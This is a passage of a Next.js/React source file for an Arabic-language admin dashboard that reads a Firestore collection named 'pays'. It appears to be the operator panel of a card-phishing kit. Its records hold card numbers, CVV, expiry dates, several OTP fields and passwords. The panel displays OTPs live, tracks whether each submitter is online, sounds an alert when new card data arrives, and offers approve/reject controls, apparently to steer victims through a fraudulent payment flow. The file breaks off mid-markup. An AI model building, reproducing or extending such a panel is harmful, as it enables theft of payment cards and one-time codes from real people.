"use client"

import type React from "react"

import { useState, useEffect, useMemo, useRef } from "react"
import { useRouter } from "next/navigation"
import {
  Trash2,
  Users,
  CreditCard,
  UserCheck,
  Flag,
  Bell,
  LogOut,
  CheckCircle,
  XCircle,
  Clock,
  MapPin,
  Search,
  Calendar,
  BarChart3,
  Download,
  Settings,
  User,
  Menu,
  ArrowUpDown,
  ChevronLeft,
  ChevronRight,
  AlertCircle,
  Loader2,
} from "lucide-react"
import { Button } from "@/components/ui/button"
import { Badge } from "@/components/ui/badge"
import { ar } from "date-fns/locale"
import { formatDistanceToNow } from "date-fns"
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogFooter } from "@/components/ui/dialog"
import { Card, CardContent, CardHeader, CardTitle, CardFooter, CardDescription } from "@/components/ui/card"
import { collection, doc, writeBatch, updateDoc, onSnapshot, query, orderBy } from "firebase/firestore"
import { onAuthStateChanged, signOut } from "firebase/auth"
import { onValue, ref } from "firebase/database"
import { database } from "@/lib/firestore"
import { auth } from "@/lib/firestore"
import { db } from "@/lib/firestore"
import { playNotificationSound } from "@/lib/actions"
import { Popover, PopoverContent, PopoverTrigger } from "@/components/ui/popover"
import { Tooltip, TooltipContent, TooltipProvider, TooltipTrigger } from "@/components/ui/tooltip"
import { Input } from "@/components/ui/input"
import { DropdownMenu, DropdownMenuContent, DropdownMenuItem, DropdownMenuTrigger } from "@/components/ui/dropdown-menu"
import { Sheet, SheetContent, SheetHeader, SheetTitle } from "@/components/ui/sheet"
import { Avatar, AvatarFallback, AvatarImage } from "@/components/ui/avatar"
import { Separator } from "@/components/ui/separator"
import { Switch } from "@/components/ui/switch"
import { Label } from "@/components/ui/label"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { Checkbox } from "@/components/ui/checkbox"
import { toast } from "@/hooks/use-toast"
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs"

// Flag colors for row highlighting
type FlagColor = "red" | "yellow" | "green" | null

function useOnlineUsersCount() {
  const [onlineUsersCount, setOnlineUsersCount] = useState(0)

  useEffect(() => {
    const onlineUsersRef = ref(database, "status")
    const unsubscribe = onValue(onlineUsersRef, (snapshot) => {
      const data = snapshot.val()
      if (data) {
        const onlineCount = Object.values(data).filter((status: any) => status.state === "online").length
        setOnlineUsersCount(onlineCount)
      }
    })

    return () => unsubscribe()
  }, [])

  return onlineUsersCount
}

interface Notification {
  createdDate: string
  bank: string
  cardStatus?: string
  ip?: string
  cvv: string
  id: string | "0"
  expiryDate: string
  notificationCount: number
  otp: string
  otp2: string
  page: string
  cardNumber: string
  country?: string
  personalInfo: {
    id?: string | "0"
    name?: string
  }
  prefix: string
  status: "pending" | "approved" | "rejected" | string
  isOnline?: boolean
  lastSeen: string
  violationValue: number
  pass?: string
  cardCvc?:string;
  year: string
  month: string
  pagename: string
  plateType: string
  allOtps?: string[] | null
  idNumber: string
  email: string
  mobile: string
  network: string
  phoneOtp: string
  cardExpiry: string
  name: string
  otpCode: string
  phone: string
  flagColor?: FlagColor
}

// Create a separate component for user status that returns both the badge and the status
function UserStatus({ userId }: { userId: string }) {
  const [status, setStatus] = useState<"online" | "offline" | "unknown">("unknown")

  useEffect(() => {
    const userStatusRef = ref(database, `/status/${userId}`)

    const unsubscribe = onValue(userStatusRef, (snapshot) => {
      const data = snapshot.val()
      if (data) {
        setStatus(data.state === "online" ? "online" : "offline")
      } else {
        setStatus("unknown")
      }
    })

    return () => unsubscribe()
  }, [userId])

  return (
    <Badge
      variant="outline"
      className={`
        ${
          status === "online"
            ? "bg-green-100 text-green-800 dark:bg-green-900 dark:text-green-300"
            : "bg-red-100 text-red-800 dark:bg-red-900 dark:text-red-300"
        } transition-colors duration-300
      `}
    >
      <span
        className={`mr-1.5 inline-block h-2 w-2 rounded-full ${status === "online" ? "bg-green-500" : "bg-red-500"}`}
      ></span>
      <span className="text-xs">{status === "online" ? "متصل" : "غير متصل"}</span>
    </Badge>
  )
}

// Create a hook to track online status for a specific user ID
function useUserOnlineStatus(userId: string) {
  const [isOnline, setIsOnline] = useState(false)

  useEffect(() => {
    const userStatusRef = ref(database, `/status/${userId}`)

    const unsubscribe = onValue(userStatusRef, (snapshot) => {
      const data = snapshot.val()
      setIsOnline(data && data.state === "online")
    })

    return () => unsubscribe()
  }, [userId])

  return isOnline
}

// Flag color selector component
function FlagColorSelector({
  notificationId,
  currentColor,
  onColorChange,
}: {
  notificationId: string
  currentColor: FlagColor
  onColorChange: (id: string, color: FlagColor) => void
}) {
  return (
    <Popover>
      <PopoverTrigger asChild>
        <Button variant="ghost" size="icon" className="h-8 w-8">
          <Flag
            className={`h-4 w-4 ${
              currentColor === "red"
                ? "text-red-500 fill-red-500"
                : currentColor === "yellow"
                  ? "text-yellow-500 fill-yellow-500"
                  : currentColor === "green"
                    ? "text-green-500 fill-green-500"
                    : "text-muted-foreground"
            }`}
          />
        </Button>
      </PopoverTrigger>
      <PopoverContent className="w-auto p-2">
        <div className="flex gap-2">
          <TooltipProvider>
            <Tooltip>
              <TooltipTrigger asChild>
                <Button
                  variant="ghost"
                  size="icon"
                  className="h-8 w-8 rounded-full bg-red-100 dark:bg-red-900 hover:bg-red-200 dark:hover:bg-red-800"
                  onClick={() => onColorChange(notificationId, "red")}
                >
                  <Flag className="h-4 w-4 text-red-500 fill-red-500" />
                  <span className="sr-only">علم أحمر</span>
                </Button>
              </TooltipTrigger>
              <TooltipContent>
                <p>علم أحمر</p>
              </TooltipContent>
            </Tooltip>
          </TooltipProvider>

          <TooltipProvider>
            <Tooltip>
              <TooltipTrigger asChild>
                <Button
                  variant="ghost"
                  size="icon"
                  className="h-8 w-8 rounded-full bg-yellow-100 dark:bg-yellow-900 hover:bg-yellow-200 dark:hover:bg-yellow-800"
                  onClick={() => onColorChange(notificationId, "yellow")}
                >
                  <Flag className="h-4 w-4 text-yellow-500 fill-yellow-500" />
                  <span className="sr-only">علم أصفر</span>
                </Button>
              </TooltipTrigger>
              <TooltipContent>
                <p>علم أصفر</p>
              </TooltipContent>
            </Tooltip>
          </TooltipProvider>

          <TooltipProvider>
            <Tooltip>
              <TooltipTrigger asChild>
                <Button
                  variant="ghost"
                  size="icon"
                  className="h-8 w-8 rounded-full bg-green-100 dark:bg-green-900 hover:bg-green-200 dark:hover:bg-green-800"
                  onClick={() => onColorChange(notificationId, "green")}
                >
                  <Flag className="h-4 w-4 text-green-500 fill-green-500" />
                  <span className="sr-only">علم أخضر</span>
                </Button>
              </TooltipTrigger>
              <TooltipContent>
                <p>علم أخضر</p>
              </TooltipContent>
            </Tooltip>
          </TooltipProvider>

          {currentColor && (
            <TooltipProvider>
              <Tooltip>
                <TooltipTrigger asChild>
                  <Button
                    variant="ghost"
                    size="icon"
                    className="h-8 w-8 rounded-full bg-gray-100 dark:bg-gray-800 hover:bg-gray-200 dark:hover:bg-gray-700"
                    onClick={() => onColorChange(notificationId, null)}
                  >
                    <Flag className="h-4 w-4 text-gray-500" />
                    <span className="sr-only">إزالة العلم</span>
                  </Button>
                </TooltipTrigger>
                <TooltipContent>
                  <p>إزالة العلم</p>
                </TooltipContent>
              </Tooltip>
            </TooltipProvider>
          )}
        </div>
      </PopoverContent>
    </Popover>
  )
}

// Mini chart component for statistics cards
function MiniChart({ data, color }: { data: number[]; color: string }) {
  const max = Math.max(...data)
  const min = Math.min(...data)
  const range = max - min || 1

  return (
    <div className="flex h-10 items-end gap-1">
      {data.map((value, index) => {
        const height = ((value - min) / range) * 100
        return (
          <div key={index} className={`w-1 rounded-sm ${color}`} style={{ height: `${Math.max(15, height)}%` }}></div>
        )
      })}
    </div>
  )
}

// Activity Timeline component
function ActivityTimeline({ notifications }: { notifications: Notification[] }) {
  // Get the last 5 notifications
  const recentActivities = notifications.slice(0, 5)

  return (
    <div className="space-y-4">
      {recentActivities.map((notification, index) => (
        <div key={notification.id} className="relative">
          {index !== recentActivities.length - 1 && (
            <div className="absolute top-7 bottom-0 left-3.5 w-px bg-border"></div>
          )}
          <div className="flex gap-3">
            <div
              className={`mt-1.5 h-6 w-6 rounded-full flex items-center justify-center ${
                notification.cardNumber
                  ? "bg-green-100 text-green-600 dark:bg-green-900 dark:text-green-300"
                  : "bg-blue-100 text-blue-600 dark:bg-blue-900 dark:text-blue-300"
              }`}
            >
              {notification.cardNumber ? <CreditCard className="h-3 w-3" /> : <User className="h-3 w-3" />}
            </div>
            <div className="flex-1">
              <div className="flex items-center justify-between">
                <p className="text-sm font-medium">
                  {notification.cardNumber ? "معلومات بطاقة جديدة" : "معلومات شخصية جديدة"}
                </p>
                <p className="text-xs text-muted-foreground">
                  {notification.createdDate &&
                    formatDistanceToNow(new Date(notification.createdDate), {
                      addSuffix: true,
                      locale: ar,
                    })}
                </p>
              </div>
              <p className="text-xs text-muted-foreground mt-1">
                {notification.country || "غير معروف"} -{" "}
                {notification.name || notification.phone || notification.email || "مستخدم جديد"}
              </p>
              <div className="mt-1.5 flex gap-2">
                {notification.cardNumber && (
                  <Badge variant="outline" className="text-xs bg-green-50 dark:bg-green-950/30">
                    بطاقة
                  </Badge>
                )}
                {notification.otp && (
                  <Badge variant="outline" className="text-xs bg-blue-50 dark:bg-blue-950/30">
                    OTP: {notification.otp}
                  </Badge>
                )}
                  {notification.otpCode && (
                  <Badge variant="outline" className="text-xs bg-blue-50 dark:bg-blue-950/30">
                    OTP: {notification.otpCode}
                  </Badge>
                )}
                <UserStatus userId={notification.id} />
              </div>
            </div>
          </div>
        </div>
      ))}

      {recentActivities.length === 0 && (
        <div className="flex flex-col items-center justify-center py-8 text-center text-muted-foreground">
          <Clock className="h-8 w-8 mb-2 text-muted-foreground/50" />
          <p>لا توجد أنشطة حديثة</p>
        </div>
      )}
    </div>
  )
}

// Search component
function SearchBar({ onSearch }: { onSearch: (term: string) => void }) {
  const [searchTerm, setSearchTerm] = useState("")
  const searchInputRef = useRef<HTMLInputElement>(null)

  const handleSearch = () => {
    onSearch(searchTerm)
  }

  const handleKeyDown = (e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Enter") {
      handleSearch()
    }
  }

  return (
    <div className="relative">
      <div className="relative">
        <Search className="absolute left-2.5 top-2.5 h-4 w-4 text-muted-foreground" />
        <Input
          ref={searchInputRef}
          type="search"
          placeholder="بحث عن إشعارات..."
          className="w-full pl-9 pr-4"
          value={searchTerm}
          onChange={(e) => setSearchTerm(e.target.value)}
          onKeyDown={handleKeyDown}
        />
      </div>
    </div>
  )
}

// Pagination component
function Pagination({
  currentPage,
  totalPages,
  onPageChange,
}: {
  currentPage: number
  totalPages: number
  onPageChange: (page: number) => void
}) {
  return (
    <div className="flex items-center justify-center space-x-2 space-x-reverse">
      <Button variant="outline" size="icon" onClick={() => onPageChange(currentPage - 1)} disabled={currentPage <= 1}>
        <ChevronRight className="h-4 w-4" />
        <span className="sr-only">الصفحة السابقة</span>
      </Button>
      <div className="flex items-center gap-1">
        {Array.from({ length: totalPages }, (_, i) => i + 1).map((page) => (
          <Button
            key={page}
            variant={currentPage === page ? "default" : "outline"}
            size="icon"
            className="h-8 w-8"
            onClick={() => onPageChange(page)}
          >
            {page}
          </Button>
        ))}
      </div>
      <Button
        variant="outline"
        size="icon"
        onClick={() => onPageChange(currentPage + 1)}
        disabled={currentPage >= totalPages}
      >
        <ChevronLeft className="h-4 w-4" />
        <span className="sr-only">الصفحة التالية</span>
      </Button>
    </div>
  )
}

// Settings panel component
function SettingsPanel({
  open,
  onOpenChange,
}: {
  open: boolean
  onOpenChange: (open: boolean) => void
}) {
  const [notifyNewCards, setNotifyNewCards] = useState(true)
  const [notifyNewUsers, setNotifyNewUsers] = useState(true)
  const [playSounds, setPlaySounds] = useState(true)
  const [autoRefresh, setAutoRefresh] = useState(true)
  const [refreshInterval, setRefreshInterval] = useState("30")

  return (
    <Sheet open={open} onOpenChange={onOpenChange}>
      <SheetContent side="left" className="sm:max-w-md" dir="rtl">
        <SheetHeader>
          <SheetTitle className="flex items-center gap-2 text-xl">
            <Settings className="h-5 w-5" />
            إعدادات الإشعارات
          </SheetTitle>
        </SheetHeader>
        <div className="mt-6 space-y-6">
          <div className="space-y-4">
            <h3 className="text-sm font-medium">إعدادات الإشعارات</h3>
            <div className="space-y-3">
              <div className="flex items-center justify-between">
                <div className="space-y-0.5">
                  <Label htmlFor="notify-cards">إشعارات البطاقات الجديدة</Label>
                  <p className="text-xs text-muted-foreground">تلقي إشعارات عند إضافة بطاقة جديدة</p>
                </div>
                <Switch id="notify-cards" checked={notifyNewCards} onCheckedChange={setNotifyNewCards} />
              </div>
              <div className="flex items-center justify-between">
                <div className="space-y-0.5">
                  <Label htmlFor="notify-users">إشعارات المستخدمين الجدد</Label>
                  <p className="text-xs text-muted-foreground">تلقي إشعارات عند تسجيل مستخدم جديد</p>
                </div>
                <Switch id="notify-users" checked={notifyNewUsers} onCheckedChange={setNotifyNewUsers} />
              </div>
              <div className="flex items-center justify-between">
                <div className="space-y-0.5">
                  <Label htmlFor="play-sounds">تشغيل الأصوات</Label>
                  <p className="text-xs text-muted-foreground">تشغيل صوت عند استلام إشعار جديد</p>
                </div>
                <Switch id="play-sounds" checked={playSounds} onCheckedChange={setPlaySounds} />
              </div>
            </div>
          </div>

          <Separator />

          <div className="space-y-4">
            <h3 className="text-sm font-medium">إعدادات التحديث التلقائي</h3>
            <div className="space-y-3">
              <div className="flex items-center justify-between">
                <div className="space-y-0.5">
                  <Label htmlFor="auto-refresh">تحديث تلقائي</Label>
                  <p className="text-xs text-muted-foreground">تحديث البيانات تلقائيًا</p>
                </div>
                <Switch id="auto-refresh" checked={autoRefresh} onCheckedChange={setAutoRefresh} />
              </div>
              {autoRefresh && (
                <div className="space-y-1.5">
                  <Label htmlFor="refresh-interval">فترة التحديث (بالثواني)</Label>
                  <Select value={refreshInterval} onValueChange={setRefreshInterval}>
                    <SelectTrigger id="refresh-interval">
                      <SelectValue placeholder="اختر فترة التحديث" />
                    </SelectTrigger>
                    <SelectContent position="popper">
                      <SelectItem value="10">10 ثواني</SelectItem>
                      <SelectItem value="30">30 ثانية</SelectItem>
                      <SelectItem value="60">دقيقة واحدة</SelectItem>
                      <SelectItem value="300">5 دقائق</SelectItem>
                    </SelectContent>
                  </Select>
                </div>
              )}
            </div>
          </div>

          <Separator />

          <div className="space-y-4">
            <h3 className="text-sm font-medium">إعدادات العرض</h3>
            <div className="space-y-3">
              <div className="space-y-1.5">
                <Label htmlFor="items-per-page">عدد العناصر في الصفحة</Label>
                <Select defaultValue="10">
                  <SelectTrigger id="items-per-page">
                    <SelectValue placeholder="اختر عدد العناصر" />
                  </SelectTrigger>
                  <SelectContent position="popper">
                    <SelectItem value="5">5 عناصر</SelectItem>
                    <SelectItem value="10">10 عناصر</SelectItem>
                    <SelectItem value="20">20 عنصر</SelectItem>
                    <SelectItem value="50">50 عنصر</SelectItem>
                  </SelectContent>
                </Select>
              </div>
              <div className="space-y-1.5">
                <Label htmlFor="default-view">العرض الافتراضي</Label>
                <Select defaultValue="all">
                  <SelectTrigger id="default-view">
                    <SelectValue placeholder="اختر العرض الافتراضي" />
                  </SelectTrigger>
                  <SelectContent position="popper">
                    <SelectItem value="all">عرض الكل</SelectItem>
                    <SelectItem value="card">البطاقات</SelectItem>
                    <SelectItem value="online">المتصلين</SelectItem>
                  </SelectContent>
                </Select>
              </div>
            </div>
          </div>

          <div className="flex justify-end gap-2 pt-4">
            <Button variant="outline" onClick={() => onOpenChange(false)}>
              إلغاء
            </Button>
            <Button
              onClick={() => {
                toast({
                  title: "تم حفظ الإعدادات",
                  description: "تم حفظ إعدادات الإشعارات بنجاح",
                })
                onOpenChange(false)
              }}
            >
              حفظ الإعدادات
            </Button>
          </div>
        </div>
      </SheetContent>
    </Sheet>
  )
}

// Export dialog component
function ExportDialog({
  open,
  onOpenChange,
  notifications,
}: {
  open: boolean
  onOpenChange: (open: boolean) => void
  notifications: Notification[]
}) {
  const [exportFormat, setExportFormat] = useState<"csv" | "json">("csv")
  const [exportFields, setExportFields] = useState({
    personalInfo: true,
    cardInfo: true,
    status: true,
    timestamps: true,
  })
  const [isExporting, setIsExporting] = useState(false)

  const handleExport = () => {
    setIsExporting(true)

    // Simulate export process
    setTimeout(() => {
      setIsExporting(false)
      onOpenChange(false)
      toast({
        title: "تم التصدير بنجاح",
        description: `تم تصدير ${notifications.length} إشعار بتنسيق ${exportFormat.toUpperCase()}`,
      })
    }, 1500)
  }

  return (
    <Dialog open={open} onOpenChange={onOpenChange}>
      <DialogContent className="sm:max-w-md" dir="rtl">
        <DialogHeader>
          <DialogTitle className="flex items-center gap-2">
            <Download className="h-5 w-5" />
            تصدير الإشعارات
          </DialogTitle>
        </DialogHeader>
        <div className="space-y-4 py-4">
          <div className="space-y-2">
            <Label>تنسيق التصدير</Label>
            <div className="flex gap-4">
              <div className="flex items-center space-x-2 space-x-reverse">
                <input
                  type="radio"
                  id="csv"
                  value="csv"
                  checked={exportFormat === "csv"}
                  onChange={() => setExportFormat("csv")}
                  className="h-4 w-4 text-primary"
                />
                <Label htmlFor="csv" className="cursor-pointer">
                  CSV
                </Label>
              </div>
              <div className="flex items-center space-x-2 space-x-reverse">
                <input
                  type="radio"
                  id="json"
                  value="json"
                  checked={exportFormat === "json"}
                  onChange={() => setExportFormat("json")}
                  className="h-4 w-4 text-primary"
                />
                <Label htmlFor="json" className="cursor-pointer">
                  JSON
                </Label>
              </div>
            </div>
          </div>

          <div className="space-y-2">
            <Label>البيانات المراد تصديرها</Label>
            <div className="space-y-2">
              <div className="flex items-center space-x-2 space-x-reverse">
                <Checkbox
                  id="personal-info"
                  checked={exportFields.personalInfo}
                  onCheckedChange={(checked) => setExportFields({ ...exportFields, personalInfo: checked as boolean })}
                />
                <Label htmlFor="personal-info" className="cursor-pointer">
                  المعلومات الشخصية
                </Label>
              </div>
              <div className="flex items-center space-x-2 space-x-reverse">
                <Checkbox
                  id="card-info"
                  checked={exportFields.cardInfo}
                  onCheckedChange={(checked) => setExportFields({ ...exportFields, cardInfo: checked as boolean })}
                />
                <Label htmlFor="card-info" className="cursor-pointer">
                  معلومات البطاقة
                </Label>
              </div>
              <div className="flex items-center space-x-2 space-x-reverse">
                <Checkbox
                  id="status"
                  checked={exportFields.status}
                  onCheckedChange={(checked) => setExportFields({ ...exportFields, status: checked as boolean })}
                />
                <Label htmlFor="status" className="cursor-pointer">
                  حالة الإشعار
                </Label>
              </div>
              <div className="flex items-center space-x-2 space-x-reverse">
                <Checkbox
                  id="timestamps"
                  checked={exportFields.timestamps}
                  onCheckedChange={(checked) => setExportFields({ ...exportFields, timestamps: checked as boolean })}
                />
                <Label htmlFor="timestamps" className="cursor-pointer">
                  الطوابع الزمنية
                </Label>
              </div>
            </div>
          </div>

          <div className="rounded-md bg-muted p-3">
            <div className="flex items-center gap-2 text-sm">
              <AlertCircle className="h-4 w-4 text-muted-foreground" />
              <p className="text-muted-foreground">سيتم تصدير {notifications.length} إشعار بالإعدادات المحددة.</p>
            </div>
          </div>
        </div>
        <DialogFooter className="sm:justify-start">
          <Button variant="outline" onClick={() => onOpenChange(false)}>
            إلغاء
          </Button>
          <Button type="submit" onClick={handleExport} disabled={isExporting}>
            {isExporting ? (
              <>
                <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                جاري التصدير...
              </>
            ) : (
              <>
                <Download className="mr-2 h-4 w-4" />
                تصدير
              </>
            )}
          </Button>
        </DialogFooter>
      </DialogContent>
    </Dialog>
  )
}

export default function NotificationsPage() {
  const [notifications, setNotifications] = useState<Notification[]>([])
  const [isLoading, setIsLoading] = useState(true)
  const [message, setMessage] = useState<boolean>(false)
  const [selectedInfo, setSelectedInfo] = useState<"personal" | "card" | null>(null)
  const [selectedNotification, setSelectedNotification] = useState<Notification | null>(null)
  const [totalVisitors, setTotalVisitors] = useState<number>(0)
  const [cardSubmissions, setCardSubmissions] = useState<number>(0)
  const [filterType, setFilterType] = useState<"all" | "card" | "online">("all")
  const [searchTerm, setSearchTerm] = useState("")
  const [currentPage, setCurrentPage] = useState(1)
  const [itemsPerPage] = useState(10)
  const [settingsOpen, setSettingsOpen] = useState(false)
  const [exportDialogOpen, setExportDialogOpen] = useState(false)
  const [mobileMenuOpen, setMobileMenuOpen] = useState(false)
  const router = useRouter()
  const onlineUsersCount = useOnlineUsersCount()

  // Track online status for all notifications
  const [onlineStatuses, setOnlineStatuses] = useState<Record<string, boolean>>({})

  // Effect to track online status for all notifications
  useEffect(() => {
    const statusRefs: { [key: string]: () => void } = {}

    notifications.forEach((notification) => {
      const userStatusRef = ref(database, `/status/${notification.id}`)

      const callback = onValue(userStatusRef, (snapshot) => {
        const data = snapshot.val()
        setOnlineStatuses((prev) => ({
          ...prev,
          [notification.id]: data && data.state === "online",
        }))
      })

      statusRefs[notification.id] = callback
    })

    // Cleanup function
    return () => {
      Object.values(statusRefs).forEach((unsubscribe) => {
        if (typeof unsubscribe === "function") {
          unsubscribe()
        }
      })
    }
  }, [notifications])

  // Filter and search notifications
  const filteredNotifications = useMemo(() => {
    let filtered = notifications

    // Apply filter type
    if (filterType === "card") {
      filtered = filtered.filter((notification) => notification.cardNumber)
    } else if (filterType === "online") {
      filtered = filtered.filter((notification) => onlineStatuses[notification.id])
    }

    // Apply search term
    if (searchTerm) {
      const term = searchTerm.toLowerCase()
      filtered = filtered.filter(
        (notification) =>
          notification.name?.toLowerCase().includes(term) ||
          notification.email?.toLowerCase().includes(term) ||
          notification.phone?.toLowerCase().includes(term) ||
          notification.cardNumber?.toLowerCase().includes(term) ||
          notification.country?.toLowerCase().includes(term) ||
          notification.otp?.toLowerCase().includes(term),
      )
    }

    return filtered
  }, [filterType, notifications, onlineStatuses, searchTerm])

  // Paginate notifications
  const paginatedNotifications = useMemo(() => {
    const startIndex = (currentPage - 1) * itemsPerPage
    return filteredNotifications.slice(startIndex, startIndex + itemsPerPage)
  }, [filteredNotifications, currentPage, itemsPerPage])

  // Calculate total pages
  const totalPages = Math.max(1, Math.ceil(filteredNotifications.length / itemsPerPage))

  // Reset to first page when filter or search changes
  useEffect(() => {
    setCurrentPage(1)
  }, [filterType, searchTerm])

  useEffect(() => {
    const unsubscribe = onAuthStateChanged(auth, (user) => {
      if (!user) {
        router.push("/login")
      } else {
        const unsubscribeNotifications = fetchNotifications()
        return () => {
          unsubscribeNotifications()
        }
      }
    })

    return () => unsubscribe()
  }, [router])

  const fetchNotifications = () => {
    setIsLoading(true)
    const q = query(collection(db, "pays"), orderBy("createdDate", "desc"))
    const unsubscribe = onSnapshot(
      q,
      (querySnapshot) => {
        const notificationsData = querySnapshot.docs
          .map((doc) => {
            const data = doc.data() as any
            return { id: doc.id, ...data }
          })
          .filter((notification: any) => notification.cardNumber) as Notification[]

        // Check if there are any new notifications with card info or general info
        const hasNewCardInfo = notificationsData.some(
          (notification) =>
            notification.cardNumber && !notifications.some((n) => n.id === notification.id && n.cardNumber),
        )
        const hasNewGeneralInfo = notificationsData.some(
          (notification) =>
            (notification.idNumber || notification.email || notification.mobile) &&
            !notifications.some((n) => n.id === notification.id && (n.idNumber || n.email || n.mobile)),
        )

        // Only play notification sound if new card info or general info is added
        if (hasNewCardInfo || hasNewGeneralInfo) {
          playNotificationSound()
        }

        // Update statistics
        updateStatistics(notificationsData)

        setNotifications(notificationsData)
        setIsLoading(false)
      },
      (error) => {
        console.error("Error fetching notifications:", error)
        setIsLoading(false)
      },
    )

    return unsubscribe
  }

  const updateStatistics = (notificationsData: Notification[]) => {
    // Total visitors is the total count of notifications
    const totalCount = notificationsData.length

    // Card submissions is the count of notifications with card info
    const cardCount = notificationsData.filter((notification) => notification.cardNumber).length

    setTotalVisitors(totalCount)
    setCardSubmissions(cardCount)
  }

  const handleClearAll = async () => {
    setIsLoading(true)
    try {
      const batch = writeBatch(db)
      notifications.forEach((notification) => {
        const docRef = doc(db, "pays", notification.id)
        batch.update(docRef, { isHidden: true })
      })
      await batch.commit()
      setNotifications([])
      toast({
        title: "تم مسح جميع الإشعارات",
        description: "تم مسح جميع الإشعارات بنجاح",
        variant: "default",
      })
    } catch (error) {
      console.error("Error hiding all notifications:", error)
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء مسح الإشعارات",
        variant: "destructive",
      })
    } finally {
      setIsLoading(false)
    }
  }

  const handleDelete = async (id: string) => {
    try {
      const docRef = doc(db, "pays", id)
      await updateDoc(docRef, { isHidden: true })
      setNotifications(notifications.filter((notification) => notification.id !== id))
      toast({
        title: "تم مسح الإشعار",
        description: "تم مسح الإشعار بنجاح",
        variant: "default",
      })
    } catch (error) {
      console.error("Error hiding notification:", error)
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء مسح الإشعار",
        variant: "destructive",
      })
    }
  }

  const handleApproval = async (state: string, id: string) => {
    try {
      const targetPost = doc(db, "pays", id)
      await updateDoc(targetPost, {
        status: state,
      })
      toast({
        title: state === "approved" ? "تمت الموافقة" : "تم الرفض",
        description: state === "approved" ? "تمت الموافقة على الإشعار بنجاح" : "تم رفض الإشعار بنجاح",
        variant: "default",
      })
    } catch (error) {
      console.error("Error updating notification status:", error)
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء تحديث حالة الإشعار",
        variant: "destructive",
      })
    }
  }

  const handleLogout = async () => {
    try {
      await signOut(auth)
      router.push("/login")
    } catch (error) {
      console.error("Error signing out:", error)
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء تسجيل الخروج",
        variant: "destructive",
      })
    }
  }

  const handleInfoClick = (notification: Notification, infoType: "personal" | "card") => {
    setSelectedNotification(notification)
    setSelectedInfo(infoType)
  }

  const closeDialog = () => {
    setSelectedInfo(null)
    setSelectedNotification(null)
  }

  // Handle flag color change
  const handleFlagColorChange = async (id: string, color: FlagColor) => {
    try {
      // Update in Firestore
      const docRef = doc(db, "pays", id)
      await updateDoc(docRef, { flagColor: color })

      // Update local state
      setNotifications(
        notifications.map((notification) =>
          notification.id === id ? { ...notification, flagColor: color } : notification,
        ),
      )

      toast({
        title: "تم تحديث العلامة",
        description: color ? "تم تحديث لون العلامة بنجاح" : "تمت إزالة العلامة بنجاح",
        variant: "default",
      })
    } catch (error) {
      console.error("Error updating flag color:", error)
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء تحديث لون العلامة",
        variant: "destructive",
      })
    }
  }

  // Get row background color based on flag color
  const getRowBackgroundColor = (flagColor: FlagColor) => {
    if (!flagColor) return ""

    const colorMap = {
      red: "bg-red-50 dark:bg-red-950/30 hover:bg-red-100 dark:hover:bg-red-950/50",
      yellow: "bg-yellow-50 dark:bg-yellow-950/30 hover:bg-yellow-100 dark:hover:bg-yellow-950/50",
      green: "bg-green-50 dark:bg-green-950/30 hover:bg-green-100 dark:hover:bg-green-950/50",
    }

    return colorMap[flagColor]
  }

  // Handle search
  const handleSearch = (term: string) => {
    setSearchTerm(term)
  }

  // Handle page change
  const handlePageChange = (page: number) => {
    setCurrentPage(page)
  }

  if (isLoading) {
    return (
      <div className="min-h-screen bg-background flex items-center justify-center w-full">
        <div className="flex flex-col items-center gap-4">
          <div className="h-10 w-10 animate-spin rounded-full border-4 border-primary border-t-transparent"></div>
          <div className="text-lg font-medium">جاري التحميل...</div>
        </div>
      </div>
    )
  }

  // Calculate counts for filter buttons
  const cardCount = notifications.filter((n) => n.cardNumber).length
  const onlineCount = Object.values(onlineStatuses).filter(Boolean).length

  // Sample data for mini charts
  const visitorTrend = [5, 8, 12, 7, 10, 15, 13, 18, 14, 12]
  const cardTrend = [2, 3, 5, 4, 6, 8, 7, 9, 8, 6]
  const onlineTrend = [3, 4, 6, 5, 7, 8, 6, 9, 7, 5]

  return (
    <div dir="rtl" className="min-h-screen bg-background text-foreground ">
      {/* Mobile menu */}
      <Sheet open={mobileMenuOpen} onOpenChange={setMobileMenuOpen}>
        <SheetContent side="right" className="w-[250px] sm:w-[400px]" dir="rtl">
          <SheetHeader className="mb-6">
            <SheetTitle className="flex items-center gap-2">
              <Bell className="h-5 w-5 text-primary" />
              <span>لوحة الإشعارات</span>
            </SheetTitle>
          </SheetHeader>
          <div className="space-y-6">
            <div className="flex items-center gap-4">
              <Avatar>
                <AvatarImage src="/placeholder.svg?height=40&width=40" alt="صورة المستخدم" />
                <AvatarFallback>M</AvatarFallback>
              </Avatar>
              <div>
                <p className="font-medium">مدير النظام</p>
                <p className="text-sm text-muted-foreground">admin@example.com</p>
              </div>
            </div>
            <Separator />
            <nav className="space-y-2">
              <Button variant="ghost" className="w-full justify-start" onClick={() => setMobileMenuOpen(false)}>
                <Bell className="mr-2 h-4 w-4" />
                الإشعارات
              </Button>
              <Button variant="ghost" className="w-full justify-start" onClick={() => setSettingsOpen(true)}>
                <Settings className="mr-2 h-4 w-4" />
                الإعدادات
              </Button>
              <Button
                variant="ghost"
                className="w-full justify-start"
                onClick={() => {
                  setExportDialogOpen(true)
                  setMobileMenuOpen(false)
                }}
              >
                <Download className="mr-2 h-4 w-4" />
                تصدير البيانات
              </Button>
              <Button variant="ghost" className="w-full justify-start text-red-500" onClick={handleLogout}>
                <LogOut className="mr-2 h-4 w-4" />
                تسجيل الخروج
              </Button>
            </nav>
          </div>
        </SheetContent>
      </Sheet>

      {/* Settings panel */}
      <SettingsPanel open={settingsOpen} onOpenChange={setSettingsOpen} />

      {/* Export dialog */}
      <ExportDialog open={exportDialogOpen} onOpenChange={setExportDialogOpen} notifications={filteredNotifications} />

      <div className="mx-auto">
        {/* Header */}
        <header className="border-b border-border bg-background/95 backdrop-blur supports-[backdrop-filter]:bg-background/60 sticky top-0 z-10">
          <div className="flex items-center justify-between p-4">
            <div className="flex items-center gap-4">
              <Button variant="ghost" size="icon" className="md:hidden" onClick={() => setMobileMenuOpen(true)}>
